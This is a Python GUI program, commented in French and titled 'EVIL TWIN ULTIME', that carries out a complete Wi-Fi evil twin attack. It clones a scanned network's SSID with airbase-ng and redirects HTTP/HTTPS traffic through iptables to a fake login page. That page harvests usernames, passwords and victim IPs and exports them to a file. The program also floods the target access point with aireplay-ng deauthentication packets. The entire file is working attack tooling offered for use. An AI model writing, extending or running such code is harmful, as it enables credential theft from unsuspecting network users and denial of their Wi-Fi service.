#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
EVIL TWIN ULTIME - JATHNIEL EDITION (VERSION RÉELLE)
✅ Scan WiFi réel
✅ Création AP avec airbase-ng
✅ Serveur de capture HTTP
✅ Déauthentification
✅ Interface GUI
"""

import os
import sys
import time
import json
import threading
import subprocess
import socket
import re
import http.server
import socketserver
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any

try:
    from PySide6.QtWidgets import *
    from PySide6.QtCore import *
    from PySide6.QtGui import *
    QT_AVAILABLE = True
except ImportError:
    print("[!] Installez PySide6: pip install PySide6")
    sys.exit(1)

# ==================== VÉRIFICATION PRIVILÈGES ====================

def check_root():
    """Vérifie que le programme est exécuté en root"""
    if os.geteuid() != 0:
        print("❌ Ce programme nécessite les privilèges root !")
        print("   sudo python3 evil_twin.py")
        sys.exit(1)

def check_dependencies():
    """Vérifie les dépendances système"""
    deps = ['airbase-ng', 'aireplay-ng', 'iwconfig']
    missing = []
    
    for dep in deps:
        if subprocess.run(['which', dep], capture_output=True).returncode != 0:
            missing.append(dep)
    
    if missing:
        print(f"❌ Dépendances manquantes: {', '.join(missing)}")
        print("   sudo apt-get install aircrack-ng")
        sys.exit(1)

check_root()
check_dependencies()

# ==================== SERVEUR DE CAPTURE - RÉEL ====================

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    """Gestionnaire de requêtes HTTP pour la page de phishing"""
    
    passwords = []
    password_callback = None
    
    def do_GET(self):
        """Sert la page de phishing"""
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>WiFi Login</title>
                <style>
                    body { font-family: Arial; background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                    .box { background: #0d0d1a; padding: 40px; border-radius: 10px; border: 1px solid #00ff88; width: 350px; }
                    h1 { color: #00ff88; text-align: center; }
                    input { width: 100%; padding: 10px; margin: 10px 0; background: #1a1a2e; border: 1px solid #2d2d44; color: white; border-radius: 5px; }
                    button { width: 100%; padding: 10px; background: #00ff88; color: black; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
                    .error { color: #ff4444; text-align: center; }
                </style>
            </head>
            <body>
                <div class="box">
                    <h1>🔐 WiFi Login</h1>
                    <p style="color: #888; text-align: center;">Veuillez vous reconnecter</p>
                    <form method="POST" action="/login">
                        <input type="text" name="username" placeholder="Nom d'utilisateur" required>
                        <input type="password" name="password" placeholder="Mot de passe" required>
                        <button type="submit">Se connecter</button>
                    </form>
                    <p class="error" style="display:none;">Identifiants incorrects</p>
                </div>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Capture les identifiants"""
        if self.path == '/login':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode()
            
            # Parse les données
            username = ''
            password = ''
            for param in post_data.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    if key == 'username':
                        username = value.replace('+', ' ')
                    elif key == 'password':
                        password = value
            
            # Sauvegarder
            if password:
                entry = {
                    'username': username,
                    'password': password,
                    'ip': self.client_address[0],
                    'timestamp': datetime.now().isoformat()
                }
                PhishingHandler.passwords.append(entry)
                
                # Appeler le callback
                if PhishingHandler.password_callback:
                    PhishingHandler.password_callback(password, self.client_address[0])
                
                print(f"[+] Mot de passe capturé: {password} depuis {self.client_address[0]}")
            
            # Rediriger vers une page d'erreur
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = """
            <!DOCTYPE html>
            <html>
            <head><title>Erreur</title></head>
            <body style="background:#1a1a2e; color:#ff4444; text-align:center; padding-top:100px;">
                <h1>❌ Erreur de connexion</h1>
                <p>Veuillez réessayer</p>
                <a href="/" style="color:#00ff88;">Retour</a>
            </body>
            </html>
            """
            self.wfile.write(html.encode())

class PhishingServer:
    """Serveur HTTP de phishing"""
    
    def __init__(self, port=8080, password_callback=None):
        self.port = port
        self.server = None
        self.thread = None
        self.running = False
        PhishingHandler.password_callback = password_callback
    
    def start(self):
        """Démarre le serveur"""
        if self.running:
            return
        
        self.running = True
        self.server = socketserver.TCPServer(('0.0.0.0', self.port), PhishingHandler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        print(f"[+] Serveur de capture démarré sur le port {self.port}")
    
    def stop(self):
        """Arrête le serveur"""
        self.running = False
        if self.server:
            self.server.shutdown()
            self.server.server_close()
    
    def get_passwords(self):
        """Récupère les mots de passe"""
        return PhishingHandler.passwords.copy()

# ==================== EVIL TWIN ENGINE ====================

class EvilTwinEngine(QObject):
    """Moteur de l'attaque Evil Twin"""
    
    status_changed = Signal(str)
    client_connected = Signal(str, dict)
    password_captured = Signal(str, str)
    
    def __init__(self):
        super().__init__()
        self.running = False
        self.interface = None
        self.ap_name = None
        self.channel = None
        self.bssid = None
        self.victims = []
        self.passwords = []
        self.processes = []
        self.phishing_server = None
    
    def scan_wifi(self):
        """Scanne les réseaux WiFi - RÉEL"""
        self.status_changed.emit("📡 Scan des réseaux WiFi...")
        
        try:
            result = subprocess.run(
                ['sudo', 'iwlist', self.interface or 'wlan0', 'scan'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode != 0:
                self.status_changed.emit("❌ Erreur de scan")
                return []
            
            networks = []
            current = {}
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                if 'Cell' in line:
                    if current and current.get('ssid'):
                        networks.append(current)
                    current = {'address': '', 'ssid': '', 'channel': '', 'encryption': '', 'signal': ''}
                
                if 'Address:' in line:
                    current['address'] = line.split('Address:')[1].strip()
                elif 'ESSID:' in line:
                    essid = line.split('ESSID:')[1].strip().strip('"')
                    current['ssid'] = essid
                elif 'Channel:' in line:
                    current['channel'] = line.split('Channel:')[1].strip()
                elif 'Encryption key:on' in line:
                    current['encryption'] = 'WPA2'
                elif 'Encryption key:off' in line:
                    current['encryption'] = 'Open'
                elif 'Quality=' in line:
                    match = re.search(r'Quality=(\d+)/(\d+)', line)
                    if match:
                        current['signal'] = match.group(1)
            
            if current and current.get('ssid'):
                networks.append(current)
            
            networks = [n for n in networks if n.get('ssid')]
            self.status_changed.emit(f"✅ {len(networks)} réseaux trouvés")
            return networks
            
        except Exception as e:
            self.status_changed.emit(f"❌ Erreur: {e}")
            return []
    
    def set_interface(self, interface):
        """Définit l'interface"""
        self.interface = interface
    
    def start_attack(self, ap_name: str, channel: str):
        """Démarre l'attaque - RÉEL"""
        if self.running:
            self.status_changed.emit("⚠️ Attaque déjà en cours")
            return
        
        if not self.interface:
            self.status_changed.emit("❌ Aucune interface sélectionnée")
            return
        
        self.ap_name = ap_name
        self.channel = channel
        self.running = True
        self.passwords = []
        self.victims = []
        
        self.status_changed.emit(f"🚀 Démarrage de l'attaque sur {ap_name}")
        
        # 1. Démarrer le serveur de phishing
        self.phishing_server = PhishingServer(
            port=8080,
            password_callback=self.on_password_captured
        )
        self.phishing_server.start()
        
        # 2. Démarrer le point d'accès avec airbase-ng
        self.start_ap()
        
        # 3. Activer le forwarding IP
        self.enable_ip_forwarding()
        
        # 4. Configurer iptables
        self.setup_iptables()
    
    def start_ap(self):
        """Démarre le point d'accès avec airbase-ng - RÉEL"""
        try:
            cmd = [
                'sudo', 'airbase-ng',
                '-e', self.ap_name,
                '-c', str(self.channel),
                '-a', '00:11:22:33:44:55',
                self.interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(process)
            self.status_changed.emit(f"✅ Point d'accès créé: {self.ap_name}")
            
        except Exception as e:
            self.status_changed.emit(f"❌ Erreur AP: {e}")
    
    def enable_ip_forwarding(self):
        """Active le forwarding IP - RÉEL"""
        try:
            subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
            self.status_changed.emit("✅ IP Forwarding activé")
        except:
            self.status_changed.emit("⚠️ IP Forwarding: échec")
    
    def setup_iptables(self):
        """Configure iptables - RÉEL"""
        try:
            # NAT
            subprocess.run([
                'sudo', 'iptables', '-t', 'nat',
                '-A', 'PREROUTING', '-p', 'tcp',
                '--dport', '80', '-j', 'REDIRECT',
                '--to-port', '8080'
            ], check=True)
            
            subprocess.run([
                'sudo', 'iptables', '-t', 'nat',
                '-A', 'PREROUTING', '-p', 'tcp',
                '--dport', '443', '-j', 'REDIRECT',
                '--to-port', '8080'
            ], check=True)
            
            self.status_changed.emit("✅ iptables configuré")
        except:
            self.status_changed.emit("⚠️ iptables: échec")
    
    def deauth_attack(self):
        """Lance une attaque de déauthentification - RÉEL"""
        if not self.running:
            self.status_changed.emit("⚠️ Aucune attaque en cours")
            return
        
        if not self.bssid:
            self.status_changed.emit("⚠️ BSSID non défini")
            return
        
        self.status_changed.emit("📡 Lancement de l'attaque de déauth...")
        
        try:
            cmd = [
                'sudo', 'aireplay-ng',
                '-0', '0',
                '-a', self.bssid,
                self.interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(process)
            self.status_changed.emit("✅ Attaque de déauth lancée")
            
        except Exception as e:
            self.status_changed.emit(f"❌ Erreur: {e}")
    
    def on_password_captured(self, password, ip):
        """Callback lors de la capture d'un mot de passe"""
        self.passwords.append({
            'password': password,
            'ip': ip,
            'timestamp': datetime.now().isoformat()
        })
        self.password_captured.emit(password, ip)
        self.status_changed.emit(f"🔑 Mot de passe capturé: {password}")
    
    def stop_attack(self):
        """Arrête l'attaque - RÉEL"""
        self.running = False
        
        # Arrêter le serveur phishing
        if self.phishing_server:
            self.phishing_server.stop()
        
        # Tuer les processus
        for process in self.processes:
            try:
                process.terminate()
            except:
                pass
        
        self.processes = []
        
        # Restaurer iptables
        try:
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], check=True)
        except:
            pass
        
        self.status_changed.emit("🛑 Attaque arrêtée")

# ==================== INTERFACE ====================

class EvilTwinGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.engine = EvilTwinEngine()
        self.current_networks = []
        self.selected_network = None
        self.setup_ui()
        self.connect_signals()
    
    def setup_ui(self):
        self.setWindowTitle("📡 EVIL TWIN ULTIME - JATHNIEL EDITION")
        self.setGeometry(100, 100, 1200, 750)
        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a2e; }
            QWidget { background-color: #1a1a2e; color: #e0e0e0; }
            QPushButton {
                background-color: #2d2d44;
                border: 1px solid #4a4a6a;
                border-radius: 6px;
                padding: 8px 16px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #3d3d5a; }
            QPushButton#danger { background-color: #6a2d2d; border-color: #8a3d3d; }
            QPushButton#success { background-color: #2d6a2d; border-color: #3d8a3d; }
            QPushButton#primary { background-color: #2d2d6a; border-color: #3d3d8a; }
            QLineEdit, QTextEdit, QComboBox {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                padding: 8px;
                color: #e0e0e0;
            }
            QTabWidget::pane {
                border: 1px solid #2d2d44;
                border-radius: 6px;
                background-color: #1a1a2e;
            }
            QTabBar::tab {
                background-color: #2d2d44;
                padding: 8px 16px;
                margin-right: 2px;
            }
            QTabBar::tab:selected { background-color: #3d3d5a; }
            QStatusBar { background-color: #0d0d1a; color: #8888aa; }
            QGroupBox {
                border: 1px solid #2d2d44;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title { color: #00ff88; }
            QListWidget {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
            }
            QTableWidget {
                background-color: #0d0d1a;
                border: 1px solid #2d2d44;
                border-radius: 6px;
                gridline-color: #2d2d44;
            }
            QHeaderView::section {
                background-color: #2d2d44;
                padding: 8px;
                border: none;
                color: #00ff88;
            }
        """)
        
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        
        # Header
        header = QLabel("📡 EVIL TWIN ULTIME - JATHNIEL EDITION")
        header.setStyleSheet("font-size: 20px; font-weight: bold; color: #00ff88;")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)
        
        # Tabs
        self.tabs = QTabWidget()
        self.tabs.addTab(self.create_scan_tab(), "📡 Scan")
        self.tabs.addTab(self.create_attack_tab(), "🎯 Attaque")
        self.tabs.addTab(self.create_passwords_tab(), "🔑 Mots de passe")
        self.tabs.addTab(self.create_console_tab(), "📟 Console")
        layout.addWidget(self.tabs)
        
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
    
    def create_scan_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Interface
        interface_group = QGroupBox("📡 Interface")
        interface_layout = QHBoxLayout()
        interface_layout.addWidget(QLabel("Interface:"))
        self.interface_combo = QComboBox()
        self.interface_combo.addItems(self.get_interfaces())
        self.interface_combo.currentTextChanged.connect(self.on_interface_changed)
        interface_layout.addWidget(self.interface_combo)
        interface_group.setLayout(interface_layout)
        layout.addWidget(interface_group)
        
        # Scan
        scan_btn = QPushButton("🔍 Scanner")
        scan_btn.setObjectName("primary")
        scan_btn.clicked.connect(self.scan_wifi)
        layout.addWidget(scan_btn)
        
        # Networks
        networks_group = QGroupBox("📶 Réseaux")
        networks_layout = QVBoxLayout()
        self.networks_list = QListWidget()
        self.networks_list.itemClicked.connect(self.on_network_selected)
        networks_layout.addWidget(self.networks_list)
        networks_group.setLayout(networks_layout)
        layout.addWidget(networks_group)
        
        # Info
        info_group = QGroupBox("📋 Informations")
        info_layout = QGridLayout()
        self.ssid_label = QLabel("SSID: -")
        info_layout.addWidget(self.ssid_label, 0, 0)
        self.channel_label = QLabel("Canal: -")
        info_layout.addWidget(self.channel_label, 0, 1)
        self.bssid_label = QLabel("BSSID: -")
        info_layout.addWidget(self.bssid_label, 1, 0)
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        select_btn = QPushButton("🎯 Sélectionner")
        select_btn.setObjectName("success")
        select_btn.clicked.connect(self.select_target)
        layout.addWidget(select_btn)
        
        layout.addStretch()
        return tab
    
    def create_attack_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        # Target
        target_group = QGroupBox("🎯 Cible")
        target_layout = QGridLayout()
        target_layout.addWidget(QLabel("SSID:"), 0, 0)
        self.target_ssid = QLabel("Aucune")
        target_layout.addWidget(self.target_ssid, 0, 1)
        target_layout.addWidget(QLabel("Canal:"), 1, 0)
        self.target_channel = QLabel("Aucun")
        target_layout.addWidget(self.target_channel, 1, 1)
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Actions
        actions_group = QGroupBox("⚡ Actions")
        actions_layout = QVBoxLayout()
        
        self.start_btn = QPushButton("🚀 Lancer")
        self.start_btn.setObjectName("success")
        self.start_btn.clicked.connect(self.start_attack)
        actions_layout.addWidget(self.start_btn)
        
        self.deauth_btn = QPushButton("📡 Déauth")
        self.deauth_btn.setObjectName("warning")
        self.deauth_btn.clicked.connect(self.deauth_attack)
        self.deauth_btn.setEnabled(False)
        actions_layout.addWidget(self.deauth_btn)
        
        self.stop_btn = QPushButton("🛑 Arrêter")
        self.stop_btn.setObjectName("danger")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        actions_layout.addWidget(self.stop_btn)
        
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        # Status
        status_group = QGroupBox("📊 Statut")
        status_layout = QVBoxLayout()
        self.attack_status = QLabel("⏸️ En attente")
        status_layout.addWidget(self.attack_status)
        self.password_count = QLabel("🔑 Mots de passe: 0")
        status_layout.addWidget(self.password_count)
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
        
        layout.addStretch()
        return tab
    
    def create_passwords_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.passwords_table = QTableWidget(0, 3)
        self.passwords_table.setHorizontalHeaderLabels(["Mot de passe", "IP", "Heure"])
        layout.addWidget(self.passwords_table)
        
        export_btn = QPushButton("💾 Exporter")
        export_btn.clicked.connect(self.export_passwords)
        layout.addWidget(export_btn)
        
        return tab
    
    def create_console_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setFontFamily("Consolas")
        layout.addWidget(self.console)
        
        clear_btn = QPushButton("🧹 Effacer")
        clear_btn.clicked.connect(lambda: self.console.clear())
        layout.addWidget(clear_btn)
        
        return tab
    
    def connect_signals(self):
        self.engine.status_changed.connect(self.update_status)
        self.engine.password_captured.connect(self.on_password_captured)
    
    def get_interfaces(self):
        interfaces = []
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
            if not interfaces:
                interfaces = ['wlan0', 'wlan1']
        except:
            interfaces = ['wlan0']
        return interfaces
    
    def on_interface_changed(self, interface):
        self.engine.set_interface(interface)
    
    def scan_wifi(self):
        self.log("🔍 Scan...")
        self.networks_list.clear()
        
        networks = self.engine.scan_wifi()
        self.current_networks = networks
        
        for net in networks:
            item = QListWidgetItem(f"{net['ssid']} ({net.get('signal', 'N/A')})")
            item.setData(Qt.UserRole, net)
            self.networks_list.addItem(item)
        
        self.log(f"✅ {len(networks)} réseaux")
    
    def on_network_selected(self, item):
        net = item.data(Qt.UserRole)
        if net:
            self.selected_network = net
            self.ssid_label.setText(f"SSID: {net['ssid']}")
            self.channel_label.setText(f"Canal: {net.get('channel', 'Inconnu')}")
            self.bssid_label.setText(f"BSSID: {net.get('address', 'Inconnu')}")
    
    def select_target(self):
        if not self.selected_network:
            self.log("❌ Sélectionnez un réseau")
            return
        
        net = self.selected_network
        self.target_ssid.setText(net['ssid'])
        self.target_channel.setText(net.get('channel', 'Inconnu'))
        self.engine.bssid = net.get('address')
        self.log(f"🎯 Cible: {net['ssid']}")
    
    def start_attack(self):
        if not self.selected_network:
            self.log("❌ Sélectionnez une cible")
            return
        
        net = self.selected_network
        self.engine.start_attack(net['ssid'], net.get('channel', '6'))
        
        self.start_btn.setEnabled(False)
        self.deauth_btn.setEnabled(True)
        self.stop_btn.setEnabled(True)
        self.attack_status.setText("🟢 Attaque en cours")
    
    def deauth_attack(self):
        self.engine.deauth_attack()
        self.log("📡 Déauth lancée")
    
    def stop_attack(self):
        self.engine.stop_attack()
        
        self.start_btn.setEnabled(True)
        self.deauth_btn.setEnabled(False)
        self.stop_btn.setEnabled(False)
        self.attack_status.setText("⏸️ Arrêtée")
        
        self.log("🛑 Attaque arrêtée")
    
    def on_password_captured(self, password, ip):
        row = self.passwords_table.rowCount()
        self.passwords_table.insertRow(row)
        self.passwords_table.setItem(row, 0, QTableWidgetItem(password))
        self.passwords_table.setItem(row, 1, QTableWidgetItem(ip))
        self.passwords_table.setItem(row, 2, QTableWidgetItem(time.strftime("%H:%M:%S")))
        
        self.password_count.setText(f"🔑 Mots de passe: {row + 1}")
        self.log(f"🔑 Mot de passe: {password} depuis {ip}")
    
    def export_passwords(self):
        if self.passwords_table.rowCount() == 0:
            self.log("❌ Aucun mot de passe")
            return
        
        filename = f"passwords_{time.strftime('%Y%m%d_%H%M%S')}.json"
        passwords = []
        for row in range(self.passwords_table.rowCount()):
            passwords.append({
                'password': self.passwords_table.item(row, 0).text(),
                'ip': self.passwords_table.item(row, 1).text(),
                'time': self.passwords_table.item(row, 2).text()
            })
        
        with open(filename, 'w') as f:
            json.dump(passwords, f, indent=2)
        
        self.log(f"✅ Exporté: {filename}")
    
    def log(self, message):
        self.console.append(f"[{time.strftime('%H:%M:%S')}] {message}")
    
    def update_status(self, status):
        self.status_bar.showMessage(status)
        self.log(status)

# ==================== MAIN ====================

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    window = EvilTwinGUI()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    main()